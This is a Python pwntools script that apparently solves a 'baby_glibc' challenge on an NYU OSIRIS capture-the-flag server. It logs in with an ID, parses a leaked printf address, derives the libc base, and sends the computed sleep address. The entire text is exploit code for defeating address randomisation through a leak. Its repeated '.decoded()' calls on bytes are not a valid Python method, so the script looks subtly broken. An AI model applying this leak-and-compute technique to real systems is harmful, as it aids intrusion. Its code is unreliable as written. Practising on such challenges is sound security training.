from pwn import *

context.log_level = "info"

LOCAL = False

if LOCAL:
    p = process("./baby_glibc_files/baby_glibc")
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1235)
    print(p.recvuntil(b"abc123):").decoded())
    p.sendline(b"nam10102")
    libc = "./baby_glibc_files/libc.so.6"

e = ELF(libc)
printf_offset = e.symbols["printf"]
sleep_offset = e.symbols["sleep"]
print(p.recvuntil(b"note: ").decoded())
printf_address = int.from_bytes(p.recvline().strip(), byteorder="little")
print("printf offset", hex(printf_offset))
print("printf address", hex(printf_address))
print("sleep offset", hex(sleep_offset))
base_address = printf_address - printf_offset
print("base address", hex(base_address))
sleep_address = base_address + sleep_offset
print("sleep address", hex(sleep_address))
print(p.recvuntil(b">").decoded())
p.sendline(hex(sleep_address))
print(p.recvline().decoded())
print(p.recvline().decoded())
print(p.recvline().decoded())
print(p.recvline().decoded())

